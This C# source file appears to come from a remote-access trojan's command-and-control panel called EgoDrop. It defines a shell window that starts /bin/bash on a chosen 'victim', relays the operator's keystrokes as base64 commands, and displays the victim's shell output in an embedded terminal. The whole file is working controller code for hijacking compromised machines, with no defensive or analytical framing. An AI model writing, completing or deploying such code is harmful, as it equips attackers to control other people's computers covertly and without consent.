using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace EgoDrop
{
    public partial class frmShell : Form
    {
        private clsAgent m_agent { get; init; }
        private clsVictim m_victim { get; init; }
        private string m_szVictimID { get; init; }
        private string m_szInitDir { get; init; }

        public frmShell(clsAgent agent, string szInitDir = ".")
        {
            InitializeComponent();

            m_agent = agent;
            m_victim = agent.m_victim;
            m_szVictimID = agent.m_szVictimID;

            m_szInitDir = szInitDir;

            Text = $"Shell | {agent.m_szUriName}";
        }

        void fnRecv(clsListener listener, clsVictim victim, string szSrcVictimID, List<string> lsMsg)
        {
            if (!clsTools.fnbSameVictim(victim, m_victim) || !string.Equals(m_szVictimID, szSrcVictimID))
                return;

            if (lsMsg[0] == "shell")
            {
                if (lsMsg[1] == "output")
                {
                    Invoke(() =>
                    {
                        byte[] abBuffer = Convert.FromBase64String(lsMsg[2]);

                        webView21.CoreWebView2.PostWebMessageAsString(lsMsg[2]);
                    });
                }
            }
        }

        async void fnSetup()
        {
            m_victim.m_listener.evtReceivedMessage += fnRecv;

            await webView21.EnsureCoreWebView2Async();
            webView21.CoreWebView2.Navigate(Path.Combine(Application.StartupPath, "terminal.html"));

            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
            {
                string msg = e.TryGetWebMessageAsString();
                if (msg.StartsWith("shell|input|"))
                {
                    string b64 = msg.Substring("shell|input|".Length);

                    m_victim.fnSendCommand(m_szVictimID, new string[]
                    {
                        "shell",
                        "input",
                        b64
                    });
                }
            };
            webView21.CoreWebView2.WebMessageReceived += (s, e) =>
            {
                string msg = e.TryGetWebMessageAsString();

                if (msg.StartsWith("shell|resize|"))
                {
                    var parts = msg.Split('|');
                    int cols = int.Parse(parts[2]);
                    int rows = int.Parse(parts[3]);

                    m_victim.fnSendCommand(m_szVictimID, new[]
                    {
                        "shell",
                        "resize",
                        cols.ToString(),
                        rows.ToString()
                    });
                }
            };

            m_victim.fnSendCommand(m_szVictimID, new string[]
            {
                "shell",
                "start",
                "/bin/bash",
                m_szInitDir,
            });

            textBox1.Text = "/bin/bash";
        }

        private void frmShell_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        private void frmShell_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_victim.m_listener.evtReceivedMessage -= fnRecv;
        }

        private void frmShell_Resize(object sender, EventArgs e)
        {
            if (webView21.CoreWebView2 != null)
            {
                webView21.CoreWebView2.ExecuteScriptAsync("fitTerminal();");
            }
        }

        //Start
        private void button1_Click(object sender, EventArgs e)
        {
            
        }
    }
}
